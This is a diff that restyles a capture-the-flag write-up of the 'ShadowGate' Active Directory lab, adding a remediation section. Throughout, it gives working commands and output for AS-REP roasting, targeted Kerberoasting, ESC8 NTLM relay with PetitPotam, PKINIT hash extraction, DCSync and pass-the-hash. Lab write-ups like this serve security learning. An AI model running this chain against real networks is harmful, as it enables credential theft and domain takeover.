@@ -1,43 +1,33 @@
-# ShadowGate
+`[AS-REP ROASTING]` `[BLOODHOUND]` `[GENERICWRITE]` `[TARGETED KERBEROASTING]` `[ADCS]` `[ESC8]` `[NTLM RELAY]` `[PKINIT]` `[DCSYNC]` `[PASS-THE-HASH]`
 
-![](./screenshots/cover.png)
+![](../.gitbook/assets/shadowgate_cover.png)
+
+**Machine Write-Up**
+
+---
 
 **Platform:** Hack Smarter Labs  
 **Difficulty:** Medium  
-**Topics:** AS-REP Roasting, Targeted Kerberoasting, AD CS ESC8, NTLM Relay (PetitPotam), PKINIT, DCSync
+**Operating System:** Windows Server 2022 Build 20348
 
 ---
 
-## Overview
+## Objective / Scope
 
-ShadowGate simulates a post-acquisition internal penetration test against an Active Directory environment. The organisation recently absorbed a new network under tight operational deadlines, deferring security hardening. Starting with no credentials, the attack chain moves from unauthenticated enumeration through AS-REP roasting, BloodHound-guided targeted Kerberoasting, and full domain compromise by abusing AD CS ESC8 via authenticated NTLM relay.
-
-**Attack Path:**
-```
-rustscan → IIS on DC + internal CA (shadow-DC01-CA) detected
-→ SMB null session → 12 domain users enumerated
-→ ASREPRoast jtrueblood (no creds required)
-→ Hashcat (cracked) → Authenticated enumeration
-→ BloodHound → jtrueblood GenericWrite over bbrown
-→ Targeted Kerberoast bbrown → Hashcat (cracked)
-→ Certipy → ESC8: web enrollment over HTTP (no signing)
-→ ntlmrelayx + PetitPotam (authenticated coerce DC01$)
-→ DC01$ certificate issued → certipy auth (PKINIT) → DC01$ NT hash
-→ secretsdump DCSync → all domain hashes
-→ evil-winrm as Administrator → Root (krbtgt NT hash)
-```
+ShadowGate simulates a post-acquisition internal penetration test against an Active Directory environment. The organisation recently absorbed a new network under tight operational deadlines, deferring security hardening. Starting with no credentials, the objective is to enumerate the domain and escalate from an unprivileged user to Domain Administrator via a chain of misconfigured AD object permissions and an abusable AD CS certificate template (ESC8).
 
 ---
 
-## Target
+<details>
+<summary>Summary</summary>
 
-| Host | IP | Role |
-|------|-----|------|
-| `DC01.shadow.gate` | `<DC_IP>` | Windows Domain Controller / CA |
+Starting from zero credentials, rustscan reveals IIS running on the DC and an internal CA (`shadow-DC01-CA`) detected via SSL certificate issuers on LDAP ports — the ESC8 precondition is visible immediately. SMB null session enumeration yields 12 domain accounts. AS-REP roasting identifies `jtrueblood` as pre-auth disabled; the hash cracks offline via Hashcat. Authenticated BloodHound collection reveals `jtrueblood` holds `GenericWrite` over `bbrown`, enabling a targeted Kerberoast — a fake SPN is temporarily assigned, the TGS ticket is requested and cracked. With `bbrown` compromised, Certipy confirms ESC8: web enrollment is enabled over plain HTTP with no channel binding. `impacket-ntlmrelayx` is positioned to relay to `/certsrv/certfnsh.asp`; PetitPotam (authenticated, via `bbrown`) coerces DC01$ into authenticating to the listener. The relay delivers a DomainController certificate for DC01$. `certipy auth` uses PKINIT to exchange the certificate for DC01$'s NT hash. `secretsdump` DCSync extracts all domain credentials. Administrator access is confirmed via evil-winrm with Pass-the-Hash.
+
+</details>
 
 ---
 
-## Service Enumeration
+## Recon
 
 ### rustscan
 
@@ -46,15 +36,16 @@ rustscan -a <DC_IP> -- -sC -sV -Pn
 ```
 
 ```
+# Console Output
 PORT      STATE    SERVICE           REASON          VERSION
-53/tcp open  domain       Simple DNS Plus
+53/tcp    open     domain            Simple DNS Plus
 80/tcp    open     tcpwrapped        syn-ack ttl 126
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: IIS Windows Server
 
-88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-09 13:43:12Z)
+88/tcp    open     kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-09 13:43:12Z)
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 135/tcp   filtered msrpc             no-response
@@ -65,8 +56,6 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 | Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
 
 445/tcp   open     microsoft-ds?     syn-ack ttl 126
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:window
-
 636/tcp   open     tcpwrapped        syn-ack ttl 126
 | ssl-cert: Subject: commonName=DC01.shadow.gate
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
@@ -78,17 +67,8 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:window
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
 | Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
 
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| rdp-enum-encryption: 
-|   Security layer
-|     CredSSP (NLA): SUCCESS
-|     CredSSP with Early User Auth: SUCCESS
-|_    RDSTLS: SUCCESS
-| ssl-cert: Subject: commonName=DC01.shadow.gate
-| Not valid before: 2026-01-11T02:45:29
-|_Not valid after:  2026-07-13T02:45:29
-|_ssl-date: 2026-06-09T12:52:40+00:00; -1s from scanner time.
-| rdp-ntlm-info: 
+3389/tcp  open     ms-wbt-server     Microsoft Terminal Services
+| rdp-ntlm-info:
 |   Target_Name: SHADOW
 |   NetBIOS_Domain_Name: SHADOW
 |   NetBIOS_Computer_Name: DC01
@@ -103,18 +83,16 @@ Key findings:
 - **Domain:** `shadow.gate`
 - **Hostname:** `DC01.shadow.gate`
 - **OS:** Windows Server 2022 (Build 20348)
-- **Port 80:** IIS 10.0 — not installed on a DC by default, worth enumerating
+- **Port 80:** IIS 10.0 — not installed on a DC by default, worth enumerating immediately
 - **SSL issuer:** `shadow-DC01-CA` on ports 389, 636, 3269 — an internal CA is running directly on this DC
 
 ### Reading the Signals
 
-Two findings from the scan, each telling you something — and more together:
-
 **Port 80 — IIS on a DC:** Windows doesn't put IIS on a DC by default. Something was deliberately installed here. Enumerate it immediately.
 
-**SSL issuer `shadow-DC01-CA` on ports 389, 636, and 3269:** Every LDAP and global catalogue port carries a cert issued by `shadow-DC01-CA`. The DC is its own CA — AD CS is running on this machine, not on a separate server somewhere else on the network.
+**SSL issuer `shadow-DC01-CA` on ports 389, 636, and 3269:** Every LDAP and global catalogue port carries a cert issued by `shadow-DC01-CA`. The DC is its own CA — AD CS is running on this machine, not on a separate server.
 
-**Together:** IIS on a CA-hosting DC is the ESC8 setup. The only open question is whether the web enrollment endpoint is exposed and running over HTTP rather than HTTPS. That's what enumerating port 80 answers.
+**Together:** IIS on a CA-hosting DC is the ESC8 setup. The only open question is whether the web enrollment endpoint is exposed over HTTP rather than HTTPS — that's what enumerating port 80 answers.
 
 ---
 
@@ -125,11 +103,12 @@ Two findings from the scan, each telling you something — and more together:
 ### Dirsearch
 
 ```
+# Console Output
 301  /aspnet_client
 401  /certsrv/
 ```
 
-`/certsrv/` returns **401 Unauthorized** — this path is the AD CS Web Enrollment interface and only exists if AD CS is installed with the Web Enrollment role enabled. The 401 confirms NTLM authentication is in use over plain HTTP, not HTTPS. NTLM over HTTP is relayable — HTTPS would enforce channel binding and prevent the relay entirely. This is the ESC8 precondition confirmed.
+`/certsrv/` returns **401 Unauthorized** — this is the AD CS Web Enrollment interface, present only if the Web Enrollment role is installed. The 401 confirms NTLM authentication over plain HTTP, not HTTPS. NTLM over HTTP is relayable — HTTPS would enforce channel binding and block the relay. ESC8 precondition confirmed.
 
 ![AD CS web enrollment — /certsrv/ over HTTP](screenshots/adcs-certsrv-exposure.png)
 
@@ -144,22 +123,22 @@ nxc smb <DC_IP> -u "" -p ""
 ```
 
 ```
+# Console Output
 [+] shadow.gate\:
 ```
 
-Null session permitted. Share access denied, guest account disabled. RID brute-force blocked.
+Null session permitted. Share access denied, guest account disabled, RID brute-force blocked.
 
 ![SMB null session test](screenshots/smb-null-session.png)
 
-### User Enumeration (Null Session)
+### User Enumeration
 
 ```bash
 nxc smb <DC_IP> -u "" -p "" --users
 ```
 
-12 domain accounts enumerated:
-
 ```
+# Console Output
 Administrator
 Guest
 krbtgt
@@ -174,19 +153,22 @@ jbradford
 amoss
 ```
 
+12 domain accounts enumerated via null session SAMR.
+
 ![SMB user enumeration — 12 accounts](screenshots/smb-user-enum.png)
 
 ---
 
-## Initial Access — AS-REP Roasting `jtrueblood`
+## Foothold — AS-REP Roasting `jtrueblood`
 
-AS-REP roasting targets accounts with **"Do not require Kerberos pre-authentication"** set — no password needed, only a valid username list.
+AS-REP roasting targets accounts with **"Do not require Kerberos pre-authentication"** enabled — no password needed, only a valid username list. The KDC returns an encrypted blob without verifying the requester's identity first, which can be cracked offline.
 
 ```bash
 nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast hashes.txt
 ```
 
 ```
+# Console Output
 LDAP  DC01  $krb5asrep$23$jtrueblood@SHADOW.GATE:caead45788330e72cd587bbe549cdd14$...
 ```
 
@@ -197,21 +179,23 @@ hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-$krb5asrep$23$jtrueblood@SHADOW.GATE:...:REDACTED
+# Console Output
+$krb5asrep$23$jtrueblood@SHADOW.GATE:...:<PASSWORD REDACTED>
 ```
 
-**Credentials: `jtrueblood:REDACTED`**
+**Credentials: `jtrueblood:<PASSWORD REDACTED>`**
 
 ![AS-REP Roast — jtrueblood hash cracked](screenshots/asreproast-jtrueblood.png)
 
 ### Verify
 
 ```bash
-nxc smb dc01.shadow.gate -u jtrueblood -p 'REDACTED' --shares
+nxc smb dc01.shadow.gate -u jtrueblood -p '<PASSWORD REDACTED>' --shares
 ```
 
 ```
-SMB  DC01  [+] SHADOW.GATE\jtrueblood:REDACTED
+# Console Output
+SMB  DC01  [+] SHADOW.GATE\jtrueblood (Authenticated)
 SMB  DC01  ADMIN$      NO ACCESS
 SMB  DC01  C$          NO ACCESS
 SMB  DC01  CertEnroll  READ
@@ -220,44 +204,42 @@ SMB  DC01  NETLOGON    READ
 SMB  DC01  SYSVOL      READ
 ```
 
-Notable: `CertEnroll` share is readable — confirms the CA.
-
----
-
-## Domain Enumeration — BloodHound
-
-```bash
-nxc ldap dc01.shadow.gate -u jtrueblood -p 'REDACTED' \
-  --bloodhound -c All --dns-server <DC_IP>
-```
-
-```
-Bloodhound data collection completed in 0M 30S
-```
-
-**Key finding — `jtrueblood` has `GenericWrite` over `bbrown`:**
-
-GenericWrite allows writing arbitrary attributes — most usefully, setting an SPN on the target account, enabling a **targeted Kerberoast** without requiring any special privilege.
-
-![BloodHound — jtrueblood GenericWrite over bbrown](screenshots/bloodhound-genericwrite-bbrown.png)
+`CertEnroll` share is readable — further confirmation of the CA.
 
 ---
 
 ## Lateral Movement — Targeted Kerberoast `bbrown`
 
-With GenericWrite over `bbrown`, temporarily assign an SPN to make the account Kerberoastable, then request and crack the TGS ticket.
+### BloodHound Collection
 
-**Why this works:** When a Kerberos SPN is registered on an account, the KDC will issue a TGS ticket for that service encrypted with the **account's NT hash**. The requester never interacts with the account's password directly — they just ask the KDC for a ticket, and the KDC obliges. GenericWrite allows writing arbitrary LDAP attributes, including `servicePrincipalName`, so the attacker registers a fake SPN on `bbrown`, requests the TGS, receives a blob encrypted with bbrown's hash, then cracks it offline. `targetedKerberoast` automates the SPN write, ticket request, and cleanup in one shot.
+```bash
+nxc ldap dc01.shadow.gate -u jtrueblood -p '<PASSWORD REDACTED>' \
+  --bloodhound -c All --dns-server <DC_IP>
+```
 
-**Tool:** [`targetedKerberoast`](https://github.com/ShutdownRepo/targetedKerberoast)
+```
+# Console Output
+Bloodhound data collection completed in 0M 30S
+```
+
+**Key finding — `jtrueblood` has `GenericWrite` over `bbrown`:**
+
+GenericWrite allows writing arbitrary LDAP attributes — most usefully, `servicePrincipalName`. Setting an SPN on a target account makes it Kerberoastable, enabling a **targeted Kerberoast** without any elevated privilege.
+
+![BloodHound — jtrueblood GenericWrite over bbrown](screenshots/bloodhound-genericwrite-bbrown.png)
+
+### Targeted Kerberoast
+
+**Why this works:** When a Kerberos SPN is registered on an account, the KDC issues a TGS ticket encrypted with the account's NT hash. The requester never touches the password — they ask the KDC for a ticket and crack it offline. `targetedKerberoast` automates the SPN write, ticket request, and cleanup in one shot.
 
 ```bash
 python3 ~/Tools/targetKerberoast/targetedKerberoast.py \
-  -u jtrueblood -p 'REDACTED' -d shadow.gate \
+  -u jtrueblood -p '<PASSWORD REDACTED>' -d shadow.gate \
   --dc-ip <DC_IP>
 ```
 
 ```
+# Console Output
 $krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$7ce933b9424f27a6cc71efc047215b97$...
 ```
 
@@ -266,14 +248,15 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-$krb5tgs$23$*bbrown$...:REDACTED
+# Console Output
+$krb5tgs$23$*bbrown$...<PASSWORD REDACTED>
 ```
 
-**Credentials: `bbrown:REDACTED`**
+**Credentials: `bbrown:<PASSWORD REDACTED>`**
 
 ### BloodHound — `bbrown` Membership
 
-`bbrown` is a member of **Certificate Service DCOM Access** — a useful BloodHound signal that confirms CA interaction rights, though ESC8 coercion only requires any valid domain account.
+`bbrown` is a member of **Certificate Service DCOM Access** — confirms CA interaction rights, though ESC8 coercion only requires any valid domain account.
 
 ![BloodHound — bbrown in Certificate Service DCOM Access](screenshots/bloodhound-bbrown-dcom-group.png)
 
@@ -281,13 +264,16 @@ $krb5tgs$23$*bbrown$...:REDACTED
 
 ---
 
-## AD CS Enumeration — Certipy
+## Privilege Escalation — AD CS ESC8 via NTLM Relay
+
+### Certipy — ESC8 Confirmed
 
 ```bash
-certipy find -u bbrown@shadow.gate -p 'REDACTED' -dc-ip <DC_IP>
+certipy find -u bbrown@shadow.gate -p '<PASSWORD REDACTED>' -dc-ip <DC_IP>
 ```
 
 ```
+# Console Output
 Certificate Authorities: 1
   CA Name: shadow-DC01-CA
   DNS Name: DC01.shadow.gate
@@ -298,19 +284,14 @@ Certificate Authorities: 1
     ESC8: Web Enrollment is enabled over HTTP
 ```
 
-**ESC8 confirmed.** ESC8 is an AD CS misconfiguration where the web enrollment endpoint (`certfnsh.asp`) accepts NTLM authentication over HTTP. Because NTLM is relayable (no signing enforcement on HTTP), an attacker can relay any incoming NTLM authentication directly to this endpoint. If the relayed account is a domain computer account (e.g. DC01$), the attacker can request a DomainController certificate on its behalf — which can then be used to obtain a TGT via PKINIT, followed by a DCSync to dump all domain hashes.
+**ESC8 confirmed.** The web enrollment endpoint (`certfnsh.asp`) accepts NTLM over HTTP. Because HTTP carries no channel binding, NTLM relayed from any domain account lands authenticated at the CA. Relaying a DC machine account (DC01$) lets us request a DomainController certificate on its behalf — usable via PKINIT to retrieve DC01$'s NT hash, then DCSync the domain.
 
-Web enrollment is enabled over plain HTTP with no channel binding, so we can:
-
-1. Coerce DC01$ into authenticating to our listener via MS-EFSRPC (PetitPotam)
-2. Relay that NTLM auth to `/certsrv/certfnsh.asp`
-3. Obtain a certificate for DC01$ (the machine account)
-4. Use the certificate with PKINIT to retrieve DC01$'s NT hash
-5. Use DC01$'s hash to DCSync the entire domain
-
----
-
-## ESC8 Exploitation — NTLM Relay via PetitPotam
+Attack chain:
+1. Coerce DC01$ auth to our listener via MS-EFSRPC (PetitPotam)
+2. Relay to `/certsrv/certfnsh.asp`
+3. Receive DomainController certificate for DC01$
+4. PKINIT → DC01$ NT hash
+5. DCSync → all domain hashes
 
 ### Step 1 — Start the Relay Listener
 
@@ -320,17 +301,18 @@ sudo impacket-ntlmrelayx \
   -smb2support --adcs --template DomainController
 ```
 
-### Step 2 — Coerce DC01$ Authentication (Authenticated MS-EFSRPC)
+### Step 2 — Coerce DC01$ Authentication
 
 > The unauthenticated variant of PetitPotam (`EfsRpcOpenFileRaw`) is patched on this target — the authenticated path via `bbrown` is required.
 
 ```bash
 python3 ~/Tools/PetitPotam/PetitPotam.py \
-  -u 'bbrown' -p 'REDACTED' -d shadow.gate \
+  -u 'bbrown' -p '<PASSWORD REDACTED>' -d shadow.gate \
   <VPN_IP> <DC_IP>
 ```
 
 ```
+# Console Output
 [+] Connected!
 [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
 [+] Successfully bound!
@@ -342,13 +324,12 @@ python3 ~/Tools/PetitPotam/PetitPotam.py \
 [+] Attack worked!
 ```
 
-The secondary EFS RPC function (`EfsRpcEncryptFileSrv`) is unpatched. Authentication coercion succeeded.
+`EfsRpcEncryptFileSrv` is unpatched — coercion succeeded.
 
 ### Step 3 — Certificate Issued
 
-Back in the relay listener:
-
 ```
+# Console Output
 [*] (SMB): Received connection from <DC_IP>, attacking target http://<DC_IP>
 [*] http:///@<DC_IP> [1] -> Generating CSR...
 [*] http:///@<DC_IP> [1] -> CSR generated!
@@ -358,21 +339,14 @@ Back in the relay listener:
 [*] http:///@<DC_IP> [1] -> Certificate successfully written to file
 ```
 
-A certificate for `DC01.shadow.gate` (the machine account) is now in `./DC01.shadow.gate.pfx`.
-
----
-
-## PKINIT — Obtaining DC01$ NT Hash
-
-Use the certificate to authenticate as DC01$ and retrieve its NT hash via PKINIT (Kerberos certificate authentication).
-
-**Why this works:** When a client authenticates with a certificate over PKINIT, the KDC still needs to support legacy NTLM-based services that require the account's NT hash. To enable this, the KDC embeds the NT hash inside the encrypted AS-REP response (the "PKINIT Unpac-the-Hash" technique). `certipy auth` decrypts that response using the certificate's private key and extracts the NT hash — no password brute-forcing, no lateral movement, just a protocol design artifact that trades convenience for security.
+### Step 4 — PKINIT: DC01$ NT Hash
 
 ```bash
 certipy auth -pfx DC01.shadow.gate.pfx -dc-ip <DC_IP>
 ```
 
 ```
+# Console Output
 [*] Certificate identities:
 [*]     SAN DNS Host Name: 'DC01.shadow.gate'
 [*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
@@ -381,89 +355,71 @@ certipy auth -pfx DC01.shadow.gate.pfx -dc-ip <DC_IP>
 [*] Got TGT
 [*] Saving credential cache to 'dc01.ccache'
 [*] Trying to retrieve NT hash for 'dc01$'
-[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:<REDACTED>
+[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>
 ```
 
-**DC01$ machine account hash obtained.**
+**Why this works:** PKINIT allows certificate-based Kerberos authentication. The KDC embeds the account's NT hash in the encrypted AS-REP to support legacy NTLM services — `certipy auth` decrypts the response using the certificate's private key and extracts the hash directly (PKINIT Unpac-the-Hash).
 
----
-
-## Full Domain Compromise — DCSync
-
-With the DC machine account hash, perform a DCSync to extract all domain credentials. Domain Controllers have replication rights by design — DC01$ can pull any object including `krbtgt`.
+### Step 5 — DCSync
 
 ```bash
 impacket-secretsdump -just-dc-ntlm \
   shadow.gate/'DC01$'@<DC_IP> \
-  -hashes 'aad3b435b51404eeaad3b435b51404ee:<REDACTED>'
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>'
 ```
 
 ```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+# Console Output
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
 ```
 
-All domain credentials dumped. Domain fully compromised.
+All domain credentials dumped.
 
----
-
-## Admin Shell — Pass-the-Hash via evil-winrm
+### Step 6 — Admin Shell
 
 ```bash
 nxc winrm dc01.shadow.gate \
-  -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<REDACTED>
+  -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>
 ```
 
 ```
-WINRM  DC01  [+] shadow.gate\Administrator:<REDACTED> (Pwn3d!)
+# Console Output
+WINRM  DC01  [+] shadow.gate\Administrator (Pwn3d!)
 ```
 
 ```bash
 evil-winrm -i <DC_IP> -u Administrator \
-  -H aad3b435b51404eeaad3b435b51404ee:<REDACTED>
+  -H aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>
 ```
 
 ```
+# Console Output
 Evil-WinRM shell v3.9
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 shadow\administrator
 ```
 
----
-
-## Root Flag
-
-This lab requires submission of the `krbtgt` NT hash rather than a file flag:
-
-```
-krbtgt NT hash: REDACTED
-```
+**Root flag:** `krbtgt NT hash: <HASH REDACTED>`
 
 ---
 
-## Summary
+## Remediation
 
-| Step | Technique | Tool |
-|------|-----------|------|
-| Service enumeration | rustscan full scan — IIS + internal CA detected | `rustscan` |
-| User enumeration | SMB null session SAMR enumeration (`--users`) | `nxc` |
-| Initial access | AS-REP Roast → offline crack | `nxc`, `Hashcat` |
-| Domain enumeration | BloodHound ACL collection | `nxc`, `BloodHound` |
-| Lateral movement | GenericWrite → Targeted Kerberoast `bbrown` → crack | `targetedKerberoast`, `Hashcat` |
-| AD CS enumeration | ESC8 — web enrollment over HTTP | `Certipy` |
-| Authentication coercion | Authenticated MS-EFSRPC via `bbrown` | `PetitPotam` |
-| NTLM relay | Relay DC01$ auth → CA → DC01$ certificate | `impacket-ntlmrelayx` |
-| PKINIT | Certificate → DC01$ NT hash | `Certipy` |
-| Domain compromise | DCSync via DC01$ machine account | `secretsdump` |
-| Root | Pass-the-hash → Administrator WinRM/evil-winrm | `evil-winrm` |
+- **Disable pre-authentication exemptions:** Remove the "Do not require Kerberos pre-authentication" flag from `jtrueblood` and audit all accounts. AS-REP roasting requires no credentials — one misconfigured account is sufficient for initial access.
+- **Audit GenericWrite and dangerous ACLs:** `jtrueblood` holding GenericWrite over `bbrown` enabled targeted Kerberoasting with no elevated privilege. Run BloodHound regularly and remove unnecessary ACEs from standard user accounts.
+- **Enforce HTTPS on web enrollment:** ESC8 requires NTLM over plain HTTP. Enabling HTTPS with Extended Protection for Authentication (EPA) enforces channel binding, making NTLM relay to `/certsrv/` impossible.
+- **Move AD CS to a dedicated server:** Running the CA on the DC collapses the security boundary. A compromised CA host equals a compromised domain.
+- **Patch MS-EFSRPC coercion:** Apply KB5005413 and consider disabling the EFS service on DCs that don't require it to eliminate the authenticated coercion path.
+- **Enable SMB signing domain-wide:** Prevents relay attacks from leveraging coerced SMB authentication.
